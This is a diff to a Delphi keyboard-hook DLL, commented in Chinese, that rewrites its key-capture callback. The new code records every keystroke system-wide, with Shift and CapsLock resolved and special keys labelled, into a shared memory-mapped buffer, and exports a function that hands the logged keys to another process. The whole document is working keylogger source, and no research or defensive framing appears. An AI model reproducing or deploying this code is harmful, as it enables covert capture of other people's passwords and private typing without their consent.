@@ -3,7 +3,7 @@ unit U_HookDLL;
 interface
 
 uses
-  Windows, Messages;
+  Windows, Messages, SysUtils;
 
 const BUFFER_SIZE = 16 * 1024;              //文件映射到内存的大小
 const HOOK_MEM_FILENAME = 'MEM_FILE';       //映像文件名称
@@ -12,7 +12,7 @@ const HOOK_MUTEX_NAME = 'MUTEX_NAME';       //互斥名称
 type
   //共享数据结构
   TShared = record
-    Keys: array[0..BUFFER_SIZE - 1] of Char;
+    Keys: array[0..BUFFER_SIZE - 1] of ShortString;
     KeyCount: Integer;
   end;
   //共享数据结构指针
@@ -28,539 +28,183 @@ implementation
 //键盘钩子回调函数
 function KeyHookProc(iCode: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT;
   stdcall; export;
-const
-  KeyMask = $80000000;
 var
-  PEvt: ^EventMsg;
   vKey: Integer;
-  iCapsLock, iNumLock, iShift: Integer;
-  bCapsLock, bNumLock, bShift: Boolean;
+  TmpStr: ShortString;
 begin
   if iCode < 0 then
     Result := CallNextHookEx(hOldKeyHook, iCode, wParam, lParam)
   else
   begin
-    if (iCode = HC_ACTION) then
+    if (iCode = HC_ACTION) or (iCode = HC_NOREMOVE) then
     begin
-      //将lParam指针传递给PEvt事件消息指针
-      PEvt := Pointer(DWord(lParam));
-
-      //键盘上有按键被压下
-      if (PEvt.Message = WM_KEYDOWN) then
-      begin
-        //取得16进制数低字节内容
-        vKey := LoByte(PEvt.paramL);
-        //获取Shift键的状态
-        iShift := GetKeyState(VK_SHIFT);
-        //获取CapsLock键的状态
-        iCapsLock := GetKeyState(VK_CAPITAL);
-        //获取NumLock键的状态
-        iNumLock := GEtKeyState(VK_NUMLOCK);
-        //Shift键是否被按下
-        bShift := ((iShift and KeyMask) = KeyMask);
-        //CapsLock键是否被按下
-        bCapsLock := (iCapsLock = 1);
-        //NumLock键是否被按下
-        bNumLock := (iNumLock = 1);
-      end;
-
-      //Number: 0..9
-      if ((vKey >= 48) and (vKey <= 57)) then
-      begin
-        if (not bShift) then
-        begin
-          Shared^.Keys[Shared^.KeyCount] := Char(vKey);
-          Inc(Shared^.KeyCount);
-          //达到缓冲区容量限制时重置
-          if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-            Shared^.KeyCount := 0;
-        end
-        else
-        begin
-          case vKey of
-            48:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := ')';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            49:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := '!';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            50:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := '@';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            51:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := '#';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            52:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := '$';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            53:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := '%';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            54:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := '^';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            55:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := '&';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            56:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := '*';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            57:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := '(';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-          end;
-        end
-      end;
-
-      if ((vKey >= 65) and (vKey <= 90)) then
-      begin
-        //未按下CapsLock键
-        if (not bCapsLock) then
-        begin
-          //已按下Shift键
-          if (bShift) then
-          begin
-            Shared^.Keys[Shared^.KeyCount] := Char(vKey);
-            Inc(Shared^.KeyCount);
-            //达到缓冲区容量限制时重置
-            if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-              Shared^.KeyCount := 0;
-          end
-          else
-          begin
-            Shared^.Keys[Shared^.KeyCount] := Char(vKey + 32);
-            Inc(Shared^.KeyCount);
-            //达到缓冲区容量限制时重置
-            if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-              Shared^.KeyCount := 0;
-          end
-        end
-        //已按下CapsLock键
-        else
-        begin
-          //已按下Shift键
-          if (bShift) then
-          begin
-            Shared^.Keys[Shared^.KeyCount] := Char(vKey + 32);
-            Inc(Shared^.KeyCount);
-            //达到缓冲区容量限制时重置
-            if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-              Shared^.KeyCount := 0;
-          end
-          else
-          begin
-            Shared^.Keys[Shared^.KeyCount] := Char(vKey);
-            Inc(Shared^.KeyCount);
-            //达到缓冲区容量限制时重置
-            if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-              Shared^.KeyCount := 0;
-          end
-        end;
-      end;
-
-      //小键盘的0..9
-      if ((vKey >= 96) and (vKey <= 105)) then
-        if bNumLock then
-        begin
-          Shared^.Keys[Shared^.KeyCount] := Char(vKey - 96 + 48);
-          Inc(Shared^.KeyCount);
-          //达到缓冲区容量限制时重置
-          if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-            Shared^.KeyCount := 0;
-        end;
-
-      //+-*/
-      if ((vKey >= 105) and (vKey <= 111)) then
+      //获取按键的Virtual Key Code
+      vKey := wParam;
+      //判断按键是否处于按下状态
+      if GetAsyncKeyState(vKey) = -32767 then
       begin
         case vKey of
-          106:
-          begin
-            Shared^.Keys[Shared^.KeyCount] := '*';
-            Inc(Shared^.KeyCount);
-            //达到缓冲区容量限制时重置
-            if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-              Shared^.KeyCount := 0;
-          end;
-          107:
-          begin
-            Shared^.Keys[Shared^.KeyCount] := '+';
-            Inc(Shared^.KeyCount);
-            //达到缓冲区容量限制时重置
-            if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-              Shared^.KeyCount := 0;
-          end;
-          109:
-          begin
-            Shared^.Keys[Shared^.KeyCount] := '-';
-            Inc(Shared^.KeyCount);
-            //达到缓冲区容量限制时重置
-            if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-              Shared^.KeyCount := 0;
-          end;
-          111:
-          begin
-            Shared^.Keys[Shared^.KeyCount] := '/';
-            Inc(Shared^.KeyCount);
-            //达到缓冲区容量限制时重置
-            if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-              Shared^.KeyCount := 0;
-          end;
-        end;
-      end;
+          8:   TmpStr := '[BackSpace]';
+          9:   TmpStr := '[Tab]';
+          13:  TmpStr := '[Enter]';
+          17:  TmpStr := '[Ctrl]';
+          27:  TmpStr := '[Esc]';
+          32:  TmpStr := '[BlankSpace]';
 
-      //特殊符号
-      if ((vKey >= 186) and (vKey <= 222)) then
-      begin
-        //若未按下Shift键
-        if (not bShift) then
-        begin
-          case vKey of
-            186:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := ';';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            187:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := '=';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            189:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := ',';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            190:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := '.';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            191:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := '/';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            192:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := '''';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            219:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := '[';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            220:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := '\';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            221:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := ']';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            222:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := Char(27);
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-          end;
-        end
-        else
-        begin
-          case vKey of
-            186:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := ':';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            187:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := '+';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            189:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := '<';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            190:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := '>';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            191:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := '?';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            192:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := '~';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            219:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := '{';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            220:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := '|';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            221:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := '}';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-            222:
-            begin
-              Shared^.Keys[Shared^.KeyCount] := '"';
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-          end;
-        end;
-      end;
+          //Del, Ins, Home, PageUp, PageDown, End
+          33:  TmpStr := '[Page Up]';
+          34:  TmpStr := '[Page Down]';
+          35:  TmpStr := '[End]';
+          36:  TmpStr := '[Home]';
 
-      if ((vKey >= 8) and (vKey <= 46)) then
-      begin
-        case vKey of
-          8:
-            begin
-              //Shared^.Keys[Shared^.KeyCount] := '[BACK]';
-              Shared^.Keys[Shared^.KeyCount] := #0;
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-          9:
-            begin
-              //Shared^.Keys[Shared^.KeyCount] := '[TAB]';
-              Shared^.Keys[Shared^.KeyCount] := #0;
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-          13:
-            begin
-              //Shared^.Keys[Shared^.KeyCount] := '[ENTER]';
-              Shared^.Keys[Shared^.KeyCount] := #0;
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-          32:
-            begin
-              //Shared^.Keys[Shared^.KeyCount] := '[SPACE]';
-              Shared^.Keys[Shared^.KeyCount] := #0;
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-          35:
-            begin
-              //Shared^.Keys[Shared^.KeyCount] := '[END]';
-              Shared^.Keys[Shared^.KeyCount] := #0;
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-          36:
-            begin
-              //Shared^.Keys[Shared^.KeyCount] := '[HOME]';
-              Shared^.Keys[Shared^.KeyCount] := #0;
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-          37:
-            begin
-              //Shared^.Keys[Shared^.KeyCount] := '[LF]';
-              Shared^.Keys[Shared^.KeyCount] := #0;
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-          38:
-            begin
-              //Shared^.Keys[Shared^.KeyCount] := '[UF]';
-              Shared^.Keys[Shared^.KeyCount] := #0;
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-          39:
-            begin
-              //Shared^.Keys[Shared^.KeyCount] := '[RF]';
-              Shared^.Keys[Shared^.KeyCount] := #0;
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-          40:
-            begin
-              //Shared^.Keys[Shared^.KeyCount] := '[DF]';
-              Shared^.Keys[Shared^.KeyCount] := #0;
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-          45:
-            begin
-              //Shared^.Keys[Shared^.KeyCount] := '[INSERT]';
-              Shared^.Keys[Shared^.KeyCount] := #0;
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-          46:
-            begin
-              //Shared^.Keys[Shared^.KeyCount] := '[DELETE]';
-              Shared^.Keys[Shared^.KeyCount] := #0;
-              Inc(Shared^.KeyCount);
-              //达到缓冲区容量限制时重置
-              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
-                Shared^.KeyCount := 0;
-            end;
-        end;
-      end;
+          //Arrow Up, Down, Left, Right
+          37:  TmpStr := '[Left]';
+          38:  TmpStr := '[Up]';
+          39:  TmpStr := '[Right]';
+          40:  TmpStr := '[Down]';
 
-      {
-      if ((lParam and KeyMask) = 0) then
-      begin
-        //捕获键盘消息
-        Shared^.Keys[Shared^.KeyCount] := Char(wParam and $00FF);
+          //PrintScreen, Insert, Delete, ScrollLock
+          44:  TmpStr := '[Print Screen]';
+          45:  TmpStr := '[Insert]';
+          46:  TmpStr := '[Del]';
+          145: TmpStr := '[Scroll Lock]';
+
+          //Number: 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 Symbol: !, @, #, $, %, ^, &, *, (, )
+          48:  if GetKeyState(VK_SHIFT) < 0 then
+                 TmpStr := ')'
+               else
+                 TmpStr := '0';
+          49:  if GetKeyState(VK_SHIFT) < 0 then
+                 TmpStr := '!'
+               else
+                 TmpStr := '1';
+          50:  if GetKeyState(VK_SHIFT) < 0 then
+                 TmpStr := '@'
+               else
+                 TmpStr := '2';
+          51:  if GetKeyState(VK_SHIFT) < 0 then
+                 TmpStr := '#'
+               else
+                 TmpStr := '3';
+          52:  if GetKeyState(VK_SHIFT) < 0 then
+                 TmpStr := '$'
+               else
+                 TmpStr := '4';
+          53:  if GetKeyState(VK_SHIFT) < 0 then
+                 TmpStr := '%'
+               else
+                 TmpStr := '5';
+          54:  if GetKeyState(VK_SHIFT) < 0 then
+                 TmpStr := '^'
+               else
+                 TmpStr := '6';
+          55:  if GetKeyState(VK_SHIFT) < 0 then
+                 TmpStr := '&'
+               else
+                 TmpStr := '7';
+          56:  if GetKeyState(VK_SHIFT) < 0 then
+                 TmpStr := '*'
+               else
+                 TmpStr := '8';
+          57:  if GetKeyState(VK_SHIFT) < 0 then
+                 TmpStr := '('
+               else
+                 TmpStr := '9';
+          //a..z, A..Z
+          65..90:
+               begin
+                 if ((GetKeyState(VK_CAPITAL)) = 1) then
+                   if GetKeyState(VK_SHIFT) < 0 then
+                     //a..z
+                     TmpStr := LowerCase(Chr(vKey))
+                   else
+                     //A..Z
+                     TmpStr := UpperCase(Chr(vKey))
+                 else
+                   if GetKeyState(VK_SHIFT) < 0 then
+                     //A..Z
+                     TmpStr := UpperCase(Chr(vKey))
+                   else
+                     //a..z
+                     TmpStr := LowerCase(Chr(vKey));
+               end;
+
+          //Win
+          91: TmpStr := '[LWin]';
+          92: TmpStr := '[RWin]';
+
+          //NumberPad
+          96..105:
+               //Number: 0..9
+               TmpStr := IntToStr(vKey - 96);
+          106: TmpStr := '*';
+          107: TmpStr := '+';
+          109: TmpStr := '-';
+          110: TmpStr := '.';
+          111: TmpStr := '/';
+          144: TmpStr := '[Num Lock]';
+
+          //F1-F12
+          112..123:
+               TmpStr := '[F' + IntToStr(vKey - 111) + ']';
+
+          186: if GetKeyState(VK_SHIFT) < 0 then
+                 TmpStr := ':'
+               else
+                 TmpStr := ';';
+          187: if GetKeyState(VK_SHIFT) < 0 then
+                 TmpStr := '+'
+               else
+                 TmpStr := '=';
+          188: if GetKeyState(VK_SHIFT) < 0 then
+                 TmpStr := '<'
+               else
+                 TmpStr := ',';
+          189: if GetKeyState(VK_SHIFT) < 0 then
+                 TmpStr := '_'
+               else
+                 TmpStr := '-';
+          190: if GetKeyState(VK_SHIFT) < 0 then
+                 TmpStr := '>'
+               else
+                 TmpStr := '.';
+          191: if GetKeyState(VK_SHIFT) < 0 then
+                 TmpStr := '?'
+               else
+                 TmpStr := '/';
+          192: if GetKeyState(VK_SHIFT) < 0 then
+                 TmpStr := '~'
+               else
+                 TmpStr := '`';
+          219: if GetKeyState(VK_SHIFT) < 0 then
+                 TmpStr := '{'
+               else
+                 TmpStr := '[';
+          220: if GetKeyState(VK_SHIFT) < 0 then
+                 TmpStr := '|'
+               else
+                 TmpStr := '\';
+          221: if GetKeyState(VK_SHIFT) < 0 then
+                 TmpStr := '}'
+               else
+                 TmpStr := ']';
+          222: if GetKeyState(VK_SHIFT) < 0 then
+                 TmpStr := '"'
+               else
+                 TmpStr := '''';
+        end;
+
+        //将获取的按键信息写入缓冲区
+        Shared^.Keys[Shared^.KeyCount] := TmpStr;
         Inc(Shared^.KeyCount);
-        //达到缓冲区容量限制时重置
-        if Shared^.KeyCount >= BUFFER_SIZE - 1 then
+
+        //缓冲区满时清空
+        if Shared^.KeyCount > BUFFER_SIZE - 1 then
           Shared^.KeyCount := 0;
       end;
-      }
     end;
 
+    //将按键信息继续传递下去
     Result := CallNextHookEx(hOldKeyHook, iCode, wParam, lParam);
   end;
 end;
@@ -599,7 +243,7 @@ begin
 end;
 
 //返回指定按键
-function GetKey(Index: Integer): Char; export;
+function GetKey(Index: Integer): ShortString; export;
 begin
   Result := Shared^.Keys[Index];
 end;
